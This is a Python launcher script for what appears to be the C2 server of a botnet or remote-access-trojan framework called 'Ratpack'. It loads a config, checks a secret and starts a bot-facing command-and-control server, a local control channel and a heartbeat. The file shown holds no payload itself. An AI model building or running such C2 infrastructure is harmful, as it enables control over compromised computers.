"""
botd.py — the bot-facing C2 daemon (no web UI).

Started by the setup wizard when the operator chooses the "bot interface".
The control channel still runs so that a web panel on another host, or the
CLI client, can drive the bots.
"""

import sys

from . import config as cfgmod
from .bots import C2Server, ControlServer, Heartbeat, log


def main():
    cfg = cfgmod.load()
    if not cfg.get("secret"):
        print("panel is not configured yet; run: python3 -m ratpack.setup_wizard",
              file=sys.stderr)
        return 1

    c2 = cfg.get("c2", {})
    secret = cfg.get("secret", "")
    server = C2Server(cfg, secret)

    control = ControlServer(server, "127.0.0.1", int(c2.get("port", 8777)) + 1)
    control.start()
    Heartbeat(server).start()

    log("Ratpack C2 (bot interface) ready")
    try:
        server.start()
    except KeyboardInterrupt:
        log("stopped")
    return 0


if __name__ == "__main__":
    sys.exit(main())
